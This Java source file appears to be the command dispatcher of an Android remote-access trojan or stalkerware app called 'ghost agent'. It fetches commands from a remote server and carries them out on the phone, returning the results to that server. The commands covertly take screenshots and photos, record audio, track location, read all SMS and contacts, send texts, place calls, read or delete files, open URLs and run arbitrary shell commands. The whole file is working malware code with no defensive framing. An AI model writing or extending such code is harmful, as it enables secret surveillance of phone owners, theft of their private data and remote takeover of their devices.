package com.ghost.agent.core;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class CommandExecutor {
    
    private static final String TAG = "CommandExecutor";
    
    private Context context;
    private NetworkManager networkManager;
    private ScreenCapture screenCapture;
    private CameraManager cameraManager;
    private AudioRecorder audioRecorder;
    private LocationTracker locationTracker;
    private FileManager fileManager;
    private SMSManager smsManager;
    private ContactManager contactManager;
    
    public CommandExecutor(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
        this.screenCapture = new ScreenCapture(context, networkManager);
        this.cameraManager = new CameraManager(context, networkManager);
        this.audioRecorder = new AudioRecorder(context, networkManager);
        this.locationTracker = new LocationTracker(context, networkManager);
        this.fileManager = new FileManager(context, networkManager);
        this.smsManager = new SMSManager(context, networkManager);
        this.contactManager = new ContactManager(context, networkManager);
    }
    
    public void checkCommands() {
        networkManager.getCommands(response -> {
            try {
                JSONArray commands = response.getJSONArray("commands");
                for (int i = 0; i < commands.length(); i++) {
                    JSONObject cmd = commands.getJSONObject(i);
                    int id = cmd.getInt("id");
                    String type = cmd.getString("command");
                    String params = cmd.optString("params", "");
                    execute(type, params, id);
                }
            } catch (Exception e) {
                Log.e(TAG, "Erreur: " + e.getMessage());
            }
        });
    }
    
    private void execute(String command, String params, int commandId) {
        Log.i(TAG, "Exécution: " + command + " | " + params);
        
        try {
            JSONObject result = new JSONObject();
            boolean success = true;
            String message = "";
            Object data = null;
            
            switch (command) {
                case "ping":
                    result.put("pong", System.currentTimeMillis());
                    break;
                    
                case "screenshot":
                    data = screenCapture.captureNow();
                    break;
                    
                case "camera_front":
                    cameraManager.startCamera(1);
                    message = "Caméra avant activée";
                    break;
                    
                case "camera_back":
                    cameraManager.startCamera(0);
                    message = "Caméra arrière activée";
                    break;
                    
                case "camera_photo":
                    data = cameraManager.takePhoto();
                    break;
                    
                case "camera_stop":
                    cameraManager.stopCamera();
                    message = "Caméra arrêtée";
                    break;
                    
                case "audio_start":
                    audioRecorder.startRecording();
                    message = "Enregistrement démarré";
                    break;
                    
                case "audio_stop":
                    data = audioRecorder.stopRecording();
                    break;
                    
                case "location":
                    data = locationTracker.getLocation();
                    break;
                    
                case "location_start":
                    locationTracker.startTracking(Integer.parseInt(params));
                    message = "Tracking démarré";
                    break;
                    
                case "location_stop":
                    locationTracker.stopTracking();
                    message = "Tracking arrêté";
                    break;
                    
                case "sms_get":
                    data = smsManager.getAllSMS();
                    break;
                    
                case "sms_send":
                    String[] parts = params.split("\\|", 2);
                    if (parts.length == 2) {
                        smsManager.sendSMS(parts[0], parts[1]);
                        message = "SMS envoyé à " + parts[0];
                    }
                    break;
                    
                case "call":
                    Intent callIntent = new Intent(Intent.ACTION_CALL);
                    callIntent.setData(Uri.parse("tel:" + params));
                    callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(callIntent);
                    message = "Appel vers " + params;
                    break;
                    
                case "contacts":
                    data = contactManager.getAllContacts();
                    break;
                    
                case "files_list":
                    data = fileManager.listFiles(params.isEmpty() ? "/storage/emulated/0" : params);
                    break;
                    
                case "file_download":
                    data = fileManager.readFile(params);
                    break;
                    
                case "file_delete":
                    fileManager.deleteFile(params);
                    message = "Fichier supprimé";
                    break;
                    
                case "vibrate":
                    vibrate(Integer.parseInt(params));
                    message = "Vibration";
                    break;
                    
                case "wake":
                    wakeDevice();
                    message = "Réveil";
                    break;
                    
                case "open_url":
                    openUrl(params);
                    message = "URL ouverte";
                    break;
                    
                case "shell":
                    data = executeShell(params);
                    break;
                    
                default:
                    success = false;
                    message = "Commande inconnue";
            }
            
            JSONObject response = new JSONObject();
            response.put("command_id", commandId);
            response.put("success", success);
            response.put("message", message);
            if (data != null) response.put("data", data);
            
            networkManager.sendCommandResult(commandId, response);
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
    }
    
    private void vibrate(int duration) {
        Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(duration);
            }
        }
    }
    
    private void wakeDevice() {
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "Ghost:WakeLock");
        wl.acquire(5000);
        wl.release();
    }
    
    private void openUrl(String url) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
    
    private String executeShell(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
        } catch (Exception e) {
            output.append("Erreur: ").append(e.getMessage());
        }
        return output.toString();
    }
}
